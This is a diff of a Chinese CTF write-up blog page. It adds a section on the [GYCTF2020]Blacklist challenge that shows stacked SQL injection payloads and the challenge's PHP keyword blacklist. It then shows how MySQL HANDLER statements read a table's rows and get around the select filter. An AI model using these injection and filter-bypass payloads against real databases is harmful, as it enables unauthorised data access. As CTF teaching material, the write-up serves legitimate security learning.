@@ -587,21 +587,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-09
+                    2022-02-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.4k
+                    3.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    15 分
+                    17 分
                 </div>
                 
 
@@ -1029,6 +1029,66 @@ password:123
 #其中202cb962ac59075b964b07152d234b70是md5(123)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>这里有个疑问为什么可以知道要md5加密？？？</p>
+<h2 id="30-GYCTF2020-Blacklist"><a href="#30-GYCTF2020-Blacklist" class="headerlink" title="30.[GYCTF2020]Blacklist"></a>30.[GYCTF2020]Blacklist</h2><p>这道题和强网杯之前的随便注几乎一样，不同的就是最后一步。考察的是<font color="#FF5E3A" size="3">联合注入</font>和<font color="#FF5E3A" size="3">Handler命令</font>。</p>
+<p>前面的注入命令如下：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 2#
+1';show tables;#
+1';show columns from FlagHere;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>如果你用到了select，会发现过滤了什么：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span><span class="token punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里就到了难点，我们不能用select，屏蔽了大小写绕过等。这里就考察了在<font color="#FF5E3A" size="3">Mysql中</font>的一个等价命令<code>handler</code>，先看看这个的语法：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
+HANDLER tbl_name OPEN [ [AS] alias]
+ 
+#通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+
+#通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+#通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+#关闭句柄
+HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来具体展示一下：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; show tables from test;
++----------------+
+| Tables_in_test |
++----------------+
+| departments    |
+| dept_emp       |
+| dept_manager   |
+| employees      |
+| salaries       |
++----------------+
+5 rows in set (0.00 sec)
+
+mysql&gt; handler salaries open;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; handler salaries read first;
++--------+--------+------------+------------+
+| emp_no | salary | from_date  | to_date    |
++--------+--------+------------+------------+
+|  10001 |   5000 | 1986-06-26 | 9999-01-01 |
++--------+--------+------------+------------+
+1 row in set (0.00 sec)
+
+mysql&gt; handler salaries close;
+Query OK, 0 rows affected (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后就可以构造payload得到flag：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <hr>
 <img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054294.jpg" style="zoom:150%;">
 
@@ -1894,7 +1954,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">29.3k</span>&nbsp;字
+                class="white-color">31.4k</span>&nbsp;字
             
             
             
